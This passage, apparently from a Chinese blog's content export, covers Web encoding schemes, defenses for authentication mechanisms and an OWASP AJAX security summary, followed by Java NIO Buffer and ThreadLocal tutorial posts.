<li>位于一个域中的页面可以加载来自其他域中的脚本并在自己的域中执行这个脚本。这是因为脚本被假定为包含代码，而非数据，因此跨域访问并不会泄露任何敏感信息。</li>
<li>位于一个域中的页面无法读取或修改属于另一个域的Cookie或者其他DOM数据。</li>
</ul>
<h1 id="编码方案"><a href="#编码方案" class="headerlink" title="编码方案"></a>编码方案</h1><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>URL只允许使用US-ASCII字符集中的可打印字符（也就是ACSII代码在0x20和0x7e范围内的字符）。而且，由于其在URL方案或HTTP协议内具有特殊含义，这个范围内的一些字符也不能用在URL中。</p>
<p>URL编码方案主要用于对扩展ASCII字符集中任何有问题的字符进行编码，使其可通过HTTP安全传输。任何URL编码的字符都以%为前缀，其后是这个字符的两位十六进制ASCII代码。</p>
<p>以下是一些常见的URL编码字符：</p>
<ul>
<li>%3d表示=</li>
<li>%25表示%</li>
<li>%20表示空格</li>
<li>%0a表示新行</li>
<li>%00表示空字节</li>
</ul>
<p>另一个指的注意的编码字符是加号（+），它代表URL编码的空格（除%20代表空格外）。</p>
<h2 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h2><p>Unicode是一种为支持全世界所使用的的各种编写系统二十几的字符编码标准，它采用各种编码方案，其中一些课用于表示Web应用程序中的不常见字符。</p>
<p>16位Unicode编码的工作原理和URL编码类似。为通过HTTP进行传输，16位的Unicode编码的字符以%u为前缀，其后是这个字符的十六进制unicode码点。</p>
<p>UTF-8是一种长度可变的编码标准，它使用一个或几个字节表示每个字符。为通过HTTP进行传输，UTF-8编码的多字节字符以%为前缀，其后用十六进制表示每个字节。</p>
<p>攻击Web应用程序时之所以要用到Unicode编码，主要在于有时可用它来破坏输入确认机制。如果输入过滤组织了某些恶意表达式，但随后处理输入的组件识别Unicode 编码，就可以使用各种标准与畸形Unicode编码避开过滤。    </p>
<h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><p>HTML编码是一种用于表示问题字符以将其安全并入HTML文档的方案。有许多字符具有特殊的含义，并被用于定义文档结构而非其内容。为了安全使用这些字符并将其用在文档内容中，就必须对其进行HTML编码。</p>
<p>此外，任何字符都可以使用它的十进制ACII码进行HTML编码，或者使用十六进制的ASCII码。</p>
<p>当攻击Web应用程序时，HTML编码主要在探查跨站点脚本漏洞时发挥作用。如果应用程序在响应中返回未被修改的用户数据，那么它可能易于受到攻击；但是，如果它对危险字符进行HTML编码，也许比较安全。</p>
<h2 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h2><p>Base64编码仅用一个可打印的ASCII字符就可安全转换任何二进制数据，它常用于对电子邮件附件进行编码，使其通过SMTP安全传输。它还可用于在基本HTTP验证机制中对用户整数进行编码。</p>
<p>Base64编码将输入数据转换成3个字节块。每个块被划分为4端，每段6个数据位。这6个数据位有64种不同的排列，因此每个段可使用一组64个字符标识。Base64、使用以下字符集，其中只包含可打印的ASCII字符：</p>
<p><strong>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</strong></p>
<p>如果最后的输入数据块不能构成3段数据输出，就用一个或者两个等号（=）补足输出。</p>
<h2 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h2><p>许多应用程序在传送二进制数据时直接使用十六进制编码，用ASCII字符表示十六进制数据块。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击验证机制</title>
    <url>/2019/03/18/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/1.%E6%94%BB%E5%87%BB%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h1><h2 id="保障验证机制的安全"><a href="#保障验证机制的安全" class="headerlink" title="保障验证机制的安全"></a>保障验证机制的安全</h2><h3 id="使用可靠的证书"><a href="#使用可靠的证书" class="headerlink" title="使用可靠的证书"></a>使用可靠的证书</h3><ul>
<li>应强制执行适当的最小密码要求。这些要求包括：最小密码长度，使用字母、数字和排版字符，同时使用大、小写字符，避免使用字典中的单词、名称和其他常见密码。避免以用户名为密码，避免使用和以前的密码相似或完全相同的密码</li>
<li>应使用唯一的用户名</li>
<li>系统生成的任何用户名和密码应具有足够的随机性，其中不包含任何顺序，及时攻击者访问大量练习生成的实例也无法对其预测。</li>
<li>允许用户设置足够强大的密码。</li>
</ul>
<h3 id="安全处理证书"><a href="#安全处理证书" class="headerlink" title="安全处理证书"></a>安全处理证书</h3><ul>
<li>应以不会造成非授权泄露的方式创建、保存和传送所有证书</li>
<li>应使用公认的加密技术（SSL）保护客户端与服务器间的所有通信。既无必要也不需要使用定制解决方案保护传输中的数据。</li>
<li>如果认为最好在应用程序的不需验证的区域使用HTTP，必须保证使用HTTPS加载登录表单，而不是在提交登录信息时才转换到HTTPS。</li>
<li>只能使用POST请求向服务器传输证书。绝不能讲证书放在URL参数或cookie中。决不能将整数返还给客户端，即使通过重定向参数也不行。</li>
<li>所有服务器-客户端应用程序组件应这样保存证书：即使攻击者能够访问应用程序数据库中存储的所有相关数据，它们也无法轻易恢复证书的原始值。达到这种目的的最常用的方法是使用强大的散列函数，并对其进行“加salt处理”以降低预先计算的离线攻击的危害。该sale应特定于拥有密码的账户，以防止攻击者重播或替换散列值。</li>
<li>一般来说，客户端“记住我”功能应仅记忆如用户名之类的非保密数据。在安全要求较低的应用程序中，可适当允许用户选择一种工具来记住密码。在这种情况下，客户端不应保存明文证书。</li>
<li>应使用一种密码修改工具，要求用户定期修改其密码</li>
<li>如果以非正常交互的形式向新建账户分配证书，应以尽可能安全的形式传送证书，并设置时间限制，要求用户在第一次登陆时修改证书，并告诉用户在初次使用后销毁通信通道。</li>
</ul>
<h3 id="正确确认证书"><a href="#正确确认证书" class="headerlink" title="正确确认证书"></a>正确确认证书</h3><ul>
<li>应确认完整密码。也就是说，区分大小写，不过滤或修改任何字符，也不截断密码。</li>
<li>应用程序应在登陆处理过程中主动防御无法预料的事件。例如，根据所使用的开发语言，应用程序应对所有API调用使用“全捕获”型异常处理程序。这些程序应明确删除用于控制登录状态的所有会话和方法内部数据，并使当前会话完全失效。因此，及时攻击者以某种方式避开验证，也会被服务器强制退出。</li>
<li>应对验证逻辑的伪代码和实际的应用程序源代码进行仔细的代码审查，以确定故障开放条件之类的逻辑错误。</li>
<li>如果应用程序执行支持用户伪装功能，应严格控制这种功能，以防止攻击者滥用它获得未授权访问。鉴于这种功能的危险程序，通常有必要从面向公众的应用程序中彻底删除该功能，只对内部管理用户开放该功能，而且他们使用伪装也应接受严格控制与审核。</li>
<li>应对多阶段登录进行严格控制，以防止攻击者破幻登录阶段之间的转换和关系。<ul>
<li>有关登录极端进展和前面验证任务结果的所有数据应保存在服务器端会话对象中，绝不可传送给客户端或由其读取</li>
<li>禁止用户多次提交一项登录信息；禁止用户修改已经被收集或确认的数据。如果需要在几个阶段使用同一个数据，应在第一次收集时将该数据保存在会话变量中，随后从此处引用该数据。</li>
<li>在每一个登录阶段，应首先合适前面的阶段均已顺利完成。如果发现前面的阶段没有完成，应立即将验证尝试标记为恶意尝试</li>
<li>为防止泄露的是哪个登录阶段失败的信息，即使用户无法正确完成前面的阶段，即使最初的用户名无效，应用程序也应总是处理完所有的登录阶段。在处理完所有的登录阶段后，应用程序应在最后阶段结束时呈现一条常规“登录失败”消息，并且不提供失败位置的任何信息</li>
</ul>
</li>
<li>如果在登录过程中需要回答一个随机变化的问题，请确保攻击者无法选择回答问题、<ul>
<li>总是采用一个多阶段登录哦过程，在第一阶段确认用户身份，并在后面的阶段向用户提出随机变化的问题。</li>
<li>如果已向某一用户提出一个特定的问题，将该问题保存在永久性用户资料中，确保每次该用户尝试登录时，向其提出相同的问题，知道该用户正确回答这个问题。</li>
</ul>
</li>
<li>如果向某个用户提出一个随机变化的质询，将提出的问题保存在服务器端会话变量而非HTML表单的隐藏字段中，并根据保存的问题核实用户随后提供的答案。</li>
</ul>
<h3 id="防止信息泄露"><a href="#防止信息泄露" class="headerlink" title="防止信息泄露"></a>防止信息泄露</h3><ul>
<li>应用程序使用各种验证机制不应通过公开的或者通过从应用程序的其他行为进行推断，来解释关于验证参数的任何信息。攻击者应无法判断是提交的哪个参数造成了问题。</li>
<li>应由单独一个代码组件使用一条常规消息负责响应所有失败的登录尝试。这样做可避免由不同代码路径返回的本应不包含大量信息的消息，因为消息排版方面的差异，不同的HTTP状态码、其他隐藏在HTML中的信息等内容而让攻击者看出差别，从而产生一个细微的漏洞。</li>
<li>如果应用程序实行某种账户锁定以防止蛮力攻击，应小心处理以防造成信息泄露。</li>
<li>如果应用程序支持自我注册， 那么他能够以两种方式防止这种功能被用于美剧现有用户名。<ul>
<li>不允许自我选择用户名，应用程序可谓每个新用户建立一个唯一的用户名，防止应用程序披露表名一个选定的用户名已经存在的信息。</li>
<li>应用程序可以使用电子邮件作为用户名。</li>
</ul>
</li>
</ul>
<h3 id="防止蛮力攻击"><a href="#防止蛮力攻击" class="headerlink" title="防止蛮力攻击"></a>防止蛮力攻击</h3><ul>
<li>必须对验证功能执行的各种质询采取保护措施，防止攻击者企图使用自动工具响应这些质询。这包括登录机制、修改密码功能和恢复遗忘密码等功能中的质询。</li>
<li>使用无法预测的用户名，同时阻止用户名美枚举，给完全盲目的蛮力攻击设置巨大障碍，并要求攻击者在实施攻击前已经通过某种方式发现一个或几个特殊的用户名。</li>
<li>一些对安全性要求极高的应用程序在检测到少数几次登录失败后应立刻禁用该账户，并要求账户所有者采取各种非常规步骤重新激活该账户。</li>
<li>如果采用临时攻讦账户的策略，应采取措施确保这种策略的效率。<ul>
<li>为防止信息泄露导致用户名枚举，应用程序决不能投罗任何账户冻结信息。相反，应用程序应对一些列即使是使用无效用户名发起的失败登录做出响应，通过一条常规消息提出警告：如果出现多次登录失败，账户将被冻结，建议用户稍后再试。</li>
<li>应用程序不应向用户透露账户锁定标准。</li>
<li>如果一个账户被冻结，那么应用程序不用检查用户证书， 直接就可以拒绝该账户的登录尝试。</li>
<li>账户锁定之类的常规应对措施对防御一种极其有效的蛮力攻击并没有帮助，即遍历大量枚举出的用户名，检查单独一个脆弱密码，如password。例如，如果5次登录失败就会触发账户冻结，这意味着攻击者能够对每个账户尝试使用4个不同的密码，而不会引起任何中断。如果一个应用程序使用许多脆弱密码，使用上述攻击手段的攻击者就能攻破许多账户。</li>
</ul>
</li>
</ul>
<h3 id="防止滥用密码修改功能"><a href="#防止滥用密码修改功能" class="headerlink" title="防止滥用密码修改功能"></a>防止滥用密码修改功能</h3><ul>
<li>应用程序应始终执行密码修改功能，允许定时使用的密码到期终止，并允许用户修改密码。<ul>
<li>只能从已通过验证的会话中访问该功能</li>
<li>不应以任何方式直接提供用户名，也不能通过隐藏表单字段或cookie提供用户名。用户企图修改他人密码的行为属非法行为。</li>
<li>作为一项高级防御措施，应用程序应对密码修改功能加以保护，防止攻击者通过其他安全缺陷获得未授权的访问。为达到这种目的，应要求用户重新输入现有密码。</li>
<li>为防止错误，新密码应输入两次。应用程序应首先比较“新密码”与“确认新密码”字段，看他们是否匹配，如果不相匹配，返回一条详细的错误信息。</li>
<li>该功能应组织可能针对主要登录机制的各种攻击：应使用一条常规错误消息告知用户现有证书中出现的任何错误；如果修改密码的尝试出现少数几次失败，应临时冻结该动能。</li>
<li>应使用非常规方式（如电子邮件）通知用户其密码已被修改，但通知消息中不得包括用户的旧证书或者新证书</li>
</ul>
</li>
</ul>
<h3 id="防止滥用账户恢复功能"><a href="#防止滥用账户恢复功能" class="headerlink" title="防止滥用账户恢复功能"></a>防止滥用账户恢复功能</h3><ul>
<li>当用户遗忘密码时，许多安全性至关重要的应用程序，通过非常规方式完成账户恢复：用户必须给呼叫中心打电话并回答一系列安全问题；新证书或重新激活代码也以非常规方式送往用户注册的家庭住址。绝大多数应用程序并不需要这种程度的安全保护，只需使用自动恢复功能即可。</li>
<li>精心设计的密码恢复机制需要放置账户被未授权方攻破，避免给和发扬用户造成任何使用中断。</li>
<li>绝对不要使用密码“暗示”之类的特性，因为攻击者可利用明显的暗示向账户发动攻击。</li>
<li>通过电子邮件给用户发送一个唯一的、具有时间限制的、无法猜测的一次性恢复URL是帮助用户重新控制账户的最佳自动化解决方案。</li>
<li>为进一步防止未授权访问，应用程序可能会向用户提出一个次要质询，用户必须在使用密码重设功能前完成该质询。</li>
</ul>
<h3 id="日志、监控与通知"><a href="#日志、监控与通知" class="headerlink" title="日志、监控与通知"></a>日志、监控与通知</h3><ul>
<li>应用程序应在日志中记录所有与验证有关的事件，包括登录、退出、密码修改、密码重置、账户冻结与账户恢复。应当在适当的地方记录所有失败与成功的登录尝试。日志中应该包含一切相关细节，但不得泄露任何安全机密。应用程序应为日志提供强有力的保护以防止未授权的方位，因为它们是信息泄露的主要源头。</li>
<li>应用程序的实时劲爆与入侵防御功能应对验证过程中的异常事件进行处理。</li>
<li>应以非常规方式向用户通报任何重大的安全事件</li>
<li>应以非常规方式向用户通报经常发生的安全事件。</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>验证</tag>
      </tags>
  </entry>
  <entry>
    <title>AJAX安全</title>
    <url>/2019/03/15/%E5%AE%89%E5%85%A8/OWSAP/0.AJAX_SERICUTY/</url>
    <content><![CDATA[<h1 id="AJAX安全"><a href="#AJAX安全" class="headerlink" title="AJAX安全"></a>AJAX安全</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本文档将为AJAX安全提供一个起点，希望后面可以根据特性的框架和技术进行合理地更新和扩展</p>
<h3 id="客户端（JavaScript）"><a href="#客户端（JavaScript）" class="headerlink" title="客户端（JavaScript）"></a>客户端（JavaScript）</h3><h4 id="使用-innerText-而不是-innerHtml"><a href="#使用-innerText-而不是-innerHtml" class="headerlink" title="使用.innerText 而不是.innerHtml"></a>使用.innerText 而不是.innerHtml</h4><p>.innerText通过编码向其传入的字符串，可以预防大部分的XSS问题。</p>
<h4 id="不要使用eval"><a href="#不要使用eval" class="headerlink" title="不要使用eval"></a>不要使用eval</h4><p>eval() 方法不可取，永远不要使用它。使用了它就代表着你的设计有问题。</p>
<h4 id="将数据传递个消费者之前，先规范化（即：使用前先编码）"><a href="#将数据传递个消费者之前，先规范化（即：使用前先编码）" class="headerlink" title="将数据传递个消费者之前，先规范化（即：使用前先编码）"></a>将数据传递个消费者之前，先规范化（即：使用前先编码）</h4><p>当使用数据构建HTML、脚本、CSS、XML和JSON等数据时，确保考虑到如何以字面意义呈现这些数据, 以保持其逻辑含义。</p>
<p>数据在使用之前应该确保合理地编码以方式注入等问题。</p>
<h4 id="不要依赖客户端逻辑来确保安全"><a href="#不要依赖客户端逻辑来确保安全" class="headerlink" title="不要依赖客户端逻辑来确保安全"></a>不要依赖客户端逻辑来确保安全</h4><p>不要忘记用户控制着客户端的逻辑。他们可以通过一些浏览器插件来设置断点，跳过代码，修改值等。永远不要依赖客户端逻辑。</p>
<h4 id="不要依赖客户端的业务逻辑"><a href="#不要依赖客户端的业务逻辑" class="headerlink" title="不要依赖客户端的业务逻辑"></a>不要依赖客户端的业务逻辑</h4><p>确保服务端实现了和客户端一样的业务逻辑或者规则，以免客户端逻辑被绕过并做出一些愚蠢、糟糕和昂贵的事情。</p>
<h4 id="避免编写序列化代码"><a href="#避免编写序列化代码" class="headerlink" title="避免编写序列化代码"></a>避免编写序列化代码</h4><p>这很难，即使是一个小错误也会导致大的安全问题。已经有很多框架提供了这个功能。</p>
<h4 id="避免动态构建XML或者JSON数据"><a href="#避免动态构建XML或者JSON数据" class="headerlink" title="避免动态构建XML或者JSON数据"></a>避免动态构建XML或者JSON数据</h4><p>就像构建HTML或者SQL会硬气XML注入漏洞一样，避免这种情况或者使用一个编码库或者安全的JSON或XML库来确保属性和元素数据安全。</p>
<h4 id="不要向客户端发送机密数据"><a href="#不要向客户端发送机密数据" class="headerlink" title="不要向客户端发送机密数据"></a>不要向客户端发送机密数据</h4><p>任何客户端知道的，用户也知道，因此，将机密的信息放在服务端比较好。</p>
<h4 id="不要在客户端进行加密"><a href="#不要在客户端进行加密" class="headerlink" title="不要在客户端进行加密"></a>不要在客户端进行加密</h4><p>使用TLS/SSL并且在服务端加密</p>
<h4 id="不要在客户端执行影响安全的逻辑"><a href="#不要在客户端执行影响安全的逻辑" class="headerlink" title="不要在客户端执行影响安全的逻辑"></a>不要在客户端执行影响安全的逻辑</h4><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><h4 id="使用CSRF保护措施"><a href="#使用CSRF保护措施" class="headerlink" title="使用CSRF保护措施"></a>使用CSRF保护措施</h4><h4 id="防止旧浏览器的JSON劫持"><a href="#防止旧浏览器的JSON劫持" class="headerlink" title="防止旧浏览器的JSON劫持"></a>防止旧浏览器的JSON劫持</h4><p>参考Angular JS的JSON劫持防御机制，参见<a href="https://docs.angularjs.org/api/ng/service/$http" target="_blank" rel="noopener">JSON Vulnerability Protection</a></p>
<p>总是让外部原语成为JSON字符串的对象：</p>
<p><strong>可以利用的</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"object"</span>: <span class="string">"inside an array"</span>&#125;]</span><br></pre></td></tr></table></figure>

<p><strong>不可以利用的</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"object"</span>: <span class="string">"not inside an array"</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>同样不可利用的</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"result"</span>: [&#123;<span class="attr">"object"</span>: <span class="string">"inside an array"</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h4 id="避免写序列化的代码。记住引用类型和值类型的区别"><a href="#避免写序列化的代码。记住引用类型和值类型的区别" class="headerlink" title="避免写序列化的代码。记住引用类型和值类型的区别"></a>避免写序列化的代码。记住引用类型和值类型的区别</h4><p>使用一个经过检验的库</p>
<h4 id="服务可以直接被用户调用"><a href="#服务可以直接被用户调用" class="headerlink" title="服务可以直接被用户调用"></a>服务可以直接被用户调用</h4><p>用户和AJAX客户端代码一样，可以调用服务端服务。确保服务端校验了输入数据。</p>
<h4 id="避免手动凭借XML或者JSON数据，使用框架"><a href="#避免手动凭借XML或者JSON数据，使用框架" class="headerlink" title="避免手动凭借XML或者JSON数据，使用框架"></a>避免手动凭借XML或者JSON数据，使用框架</h4><p>使用安全的框架，不要手工拼接，这可能引起安全问题。</p>
<h4 id="对WebServices使用XML和JSON模式"><a href="#对WebServices使用XML和JSON模式" class="headerlink" title="对WebServices使用XML和JSON模式"></a>对WebServices使用XML和JSON模式</h4><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/AJAX_Security_Cheat_Sheet.md" target="_blank" rel="noopener">https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/AJAX_Security_Cheat_Sheet.md</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>AJAX</tag>
      </tags>
  </entry>
  <entry>
    <title>Abuse_case</title>
    <url>/2019/03/15/%E5%AE%89%E5%85%A8/OWSAP/1.Abuse_case/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Abuse case</tag>
      </tags>
  </entry>
  <entry>
    <title>Access Control</title>
    <url>/2019/03/15/%E5%AE%89%E5%85%A8/OWSAP/2.Access_Control/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Access Control</tag>
      </tags>
  </entry>
  <entry>
    <title>NIO-Buffer</title>
    <url>/2018/12/30/Java/NIO/JAVA-NIO-000001-Buffer/</url>
    <content><![CDATA[<h1 id="缓冲区-Buffer"><a href="#缓冲区-Buffer" class="headerlink" title="缓冲区-Buffer"></a>缓冲区-Buffer</h1><p>一个Buffer对象是固定数量的数据的容器。其作用是一个存储器，或者分段运输区，在这里数据可被存储并在之后用于检索。</p>
<p>下图是Buffer的类层次图。在顶部是通用Buffer类。Buffe定义所有缓冲区类型共有的操作，无论是它们所包含的数据类型还是可能具有的特定的行为。</p>
<p><img src="https://huhansi.github.io/images/2020-03-01-buffer-classes.png" alt="Buffer类及其子类"></p>
<h2 id="缓冲区基础"><a href="#缓冲区基础" class="headerlink" title="缓冲区基础"></a>缓冲区基础</h2><p>概念上，缓冲区时报在一个对象内的基本数据元素数组。Buffer类相比一个简单数组的优点是它将关于数据的数据内容和信息包含在一个单一的对象中。Buffer类以及它专有的子类定义了一个用于处理数据缓冲区的API。</p>
<h3 id="缓冲区属性"><a href="#缓冲区属性" class="headerlink" title="缓冲区属性"></a>缓冲区属性</h3><p>所有的缓冲区都具有四个属性来提供关于其所包含的数据元素的信息，分别是：</p>
<h4 id="容量（Capacity）"><a href="#容量（Capacity）" class="headerlink" title="容量（Capacity）"></a>容量（Capacity）</h4><p>缓冲区能够容纳的数据元素的最大个数。这个容量在缓冲区创建的时候就被指定，并且无法改变。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方说明</span><br><span class="line">&lt;p&gt; A buffer&#39;s &lt;i&gt;capacity&lt;&#x2F;i&gt; is the number of elements it contains.  The</span><br><span class="line"> *   capacity of a buffer is never negative and never changes.  &lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<h4 id="上限（Limit）"><a href="#上限（Limit）" class="headerlink" title="上限（Limit）"></a>上限（Limit）</h4><p>缓冲区的第一个不能被读或者写的元素。或者说，缓冲区中现存元素的计数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方说明</span><br><span class="line">&lt;p&gt; A buffer&#39;s &lt;i&gt;limit&lt;&#x2F;i&gt; is the index of the first element that should</span><br><span class="line"> *   not be read or written.  A buffer&#39;s limit is never negative and is never</span><br><span class="line"> *   greater than its capacity.  &lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<h4 id="位置（Position）"><a href="#位置（Position）" class="headerlink" title="位置（Position）"></a>位置（Position）</h4><p>下一个即将要被读或者写的元素的位置。位置会自动由响应的get()和put()函数更新。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方说明</span><br><span class="line">&lt;p&gt; A buffer&#39;s &lt;i&gt;position&lt;&#x2F;i&gt; is the index of the next element to be</span><br><span class="line"> *   read or written.  A buffer&#39;s position is never negative and is never</span><br><span class="line"> *   greater than its limit.  &lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<h4 id="标记（Mark）"><a href="#标记（Mark）" class="headerlink" title="标记（Mark）"></a>标记（Mark）</h4><p>一个备忘位置。调用mark()来设定mark = position。调用reset()设定position = mark。标记在设定前是未定义的。一旦被定义，其值用不可能大于当前的position和非负数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方说明</span><br><span class="line">&lt;p&gt; A buffer&#39;s &lt;i&gt;mark&lt;&#x2F;i&gt; is the index to which its position will be reset</span><br><span class="line"> * when the &#123;@link #reset reset&#125; method is invoked.  The mark is not always</span><br><span class="line"> * defined, but when it is defined it is never negative and is never greater</span><br><span class="line"> * than the position.  If the mark is defined then it is discarded when the</span><br><span class="line"> * position or the limit is adjusted to a value smaller than the mark.  If the</span><br><span class="line"> * mark is not defined then invoking the &#123;@link #reset reset&#125; method causes an</span><br><span class="line"> * &#123;@link InvalidMarkException&#125; to be thrown.</span><br></pre></td></tr></table></figure>

<p>这四个属性之间总是遵循下面的关系：<br>0 &lt;= mark &lt;= postion &lt;= limit &lt;= capacity</p>
]]></content>
      <categories>
        <category>java NIO</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>Thread-Specific-Storage模式</title>
    <url>/2018/10/26/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/11.Thread-Specific-Storage/</url>
    <content><![CDATA[<h2 id="Thread-Specific-Storage模式"><a href="#Thread-Specific-Storage模式" class="headerlink" title="Thread-Specific-Storage模式"></a>Thread-Specific-Storage模式</h2><p>Thread-Specific-Storage是一种即使只有一个入口，也会在内部为每个线程分配特有的存储空间的模式。</p>
<p>在Java标准类库中，java.lang.ThreadLocal类实现了该模式。</p>
<h2 id="关于ThreadLocal类"><a href="#关于ThreadLocal类" class="headerlink" title="关于ThreadLocal类"></a>关于ThreadLocal类</h2><h3 id="java-lang-ThreadLocal就是储物间"><a href="#java-lang-ThreadLocal就是储物间" class="headerlink" title="java.lang.ThreadLocal就是储物间"></a>java.lang.ThreadLocal就是储物间</h3><p>将java.lang.ThreadLocal的实例当做一种集合可能会有助于大家理解它。也就是说，一个ThreadLocal的实例会管理多个对象。</p>
<p>由于一个ThreadLocal的实例可以管理多个多想，所有ThreadLocal定义了可以“存储”（set）和“获取”（get）对象的方法。</p>
<h3 id="Set方法"><a href="#Set方法" class="headerlink" title="Set方法"></a>Set方法</h3><p>ThreadLocal类的set方法用于将通过参数接受的实例与调用该方法的线程（当前线程）对应并存储起来。这里存储的对象可以通过get方法获取。set方法中没有表示线程的参数。set方法会先查询当前线程（即表达式Thread.currentThread()的值），然后以它作为键来存储实例。</p>
<h3 id="get方法"><a href="#get方法" class="headerlink" title="get方法"></a>get方法</h3><p>ThreadLocal类的get方法用于获取与调用get方法的线程（当前线程）对应的实例。该线程之前通过set方法存储的实例就是get方法的返回值。如果之前一次都还没有调用过set方法，则get方法的返回值为null。</p>
<p>与set方法一样，get方法中也没有表示线程的参数。这是因为，get方法也回去查询当前线程。即get方法会以当前线程自身作为键取获取对象。</p>
<h3 id="java-lang-ThreadLocal与泛型"><a href="#java-lang-ThreadLocal与泛型" class="headerlink" title="java.lang.ThreadLocal与泛型"></a>java.lang.ThreadLocal与泛型</h3><p>java.lang.ThreadLocal是一个泛型类，可以通过参数的类型来指定要存储的对象的类型。ThreadLocal类的声明大致如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocal</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即，通过ThreadLocal<T>的T指定的类型就是set方法的参数的类型以及get方法的返回值的类型。</T></p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>TsLog</td>
<td>创建日志的类（实例属于各个线程所有）</td>
</tr>
<tr>
<td>Log</td>
<td>创建日志的类（分配各个线程）</td>
</tr>
<tr>
<td>java.lang.ThreadLocal</td>
<td>分配线程特有的存储空间的类</td>
</tr>
<tr>
<td>ClientThread</td>
<td>表示调用Log的线程的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="TSLog类"><a href="#TSLog类" class="headerlink" title="TSLog类"></a>TSLog类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TSLog</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> PrintWriter printWriter = <span class="keyword">null</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">TSLog</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			printWriter = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> FileWriter(fileName));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		printWriter.println(s);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		printWriter.println(<span class="string">"==== End of log ===="</span>);</span><br><span class="line">		printWriter.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

